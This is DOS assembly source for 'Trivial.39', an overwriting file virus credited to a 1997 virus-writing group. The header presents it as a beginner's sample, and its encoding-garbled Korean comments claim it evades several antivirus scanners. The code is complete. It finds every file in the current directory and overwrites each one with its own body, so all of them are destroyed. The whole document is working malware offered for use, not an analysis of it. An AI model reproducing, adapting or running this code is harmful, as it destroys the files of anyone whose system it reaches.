;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                         Trivial.39                           CVC #02  97/09
;
;  VirusName : Trivial.39
;  Author : Osiris
;  Group : CVC (Corean Virus Club) / Corea
;  Date : 1997/08/15
;
;  Type : Non Resident  Overwriting
;
;  for Beginers
;
;  From the Corean Virus Factory !
;
;  §¡¬wºÑw ‰sÁa³a‹¡ ¤a·¡œá¯a·¡”a. ˆa¸w ˆe”eÐe ¤a·¡œá¯a¡ Ñe¸ —¡BÉ¡Ÿ¡·
;  ¡¡—e Ìa·©·i ÌaŠAÐe”a.
;
;  AVP,FINDVIRU,F-PROT,SCAN,V3PRO µA¬á »¥”e–A»¡ ´g“e”a.
;  ”e, TBAV µA¬á e Vorbis.155/166 ¡ »¥”e–E”a.
;
;  !! º· !!
;  ¥¥ ­¡¯a“e µ¡»¢ Ša·B¶w·a¡ e ¬a¶w–A´á´¡ Ðs“¡”a. ¥¥ ­¡¯a¡ ·¥Ð ¤i¬—Ðe ¡¡—e
;  ¢…¹A· À‚·±·e ¬a¶w¸aµA‰A ·¶·a¡a ¹A¸b¸a“e ´á˜áÐe À‚·±•¡ »¡»¡ ´g¯s“¡”a.
;
;                                   (c) Copyleft 1997 by Osiris of CVC, COREA
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 .MODEL TINY
 .CODE
  ORG   100h

 Start:
        mov   ah,4Eh                    ; AH = 4Eh (Ìa·© Àx‹¡)
        mov   cx,0                      ; CX = Ìa·© ­¢¬÷
        lea   dx, mask_all              ; DX = Àx·i Ìa·© (*.* : ¡¡—e Ìa·©)
 Find:
        int   21h                       ; ¯©Ð— !
        jc    Done                      ; µAœá ·¥ˆa ?

        mov   ah,3ch                    ; Ìa·© ¬—¬÷
        mov   dx,009Eh                  ; ‹¡¥¥ DTA ˆt·e 0080h ·¡”a. +1Eh ˆa
        int   21h                       ; Ìa·© ·¡Ÿq·¡£a¡ 9Eh “e Ìa·© ·¡Ÿq·¡
                                        ; ¹¥¸Ðe”a.
        xchg  ax,bx                     ; AX,BX ˆt·i ŠaÑÅÐe”a. 1 ¤a·¡Ëa ¼aŸ¡
                                        ; ¡ww·¡¡a BX “e Ìa·© Ð…—i·i ˆa»¡‰A
                                        ; –E”a.
        mov   ah,40h                    ; Ìa·© ³a‹¡
        mov   cx, offset End_Trivial - 100h   ; Ça‹¡
        mov   dx,100h                   ; ³i µ¡Ïa­U º­¡ˆt
        int   21h                       ;

;       mov   ah,3Eh                    ; Ìa·© ”h‹¡
;       int   21h                       ; ´ô´á•¡ ¥i ¢…¹A ´ô·q
;       Ða»¡ e, ˆqµq ¯¡Ç© Ìa·© ˆ•®ˆa  g·a¡e ¢…¹Aˆa ¬—‹© ® ·¶·q

        mov   ah,4Fh                    ; ”a·q Ìa·© Àx‹¡
        jmp   Find                      ;
 Done:
        RET                             ; PSP:0 ˆt·e CD 20h »b Int 20h ·¡”a.
                                        ; Ïa¡‹aœ‘·¡ ¹·ža–E”a.
 Mask_All db '*.*',00                   ; ¡¡—e Ìa·© Àx‹¡
 End_Trivial:

        END    START
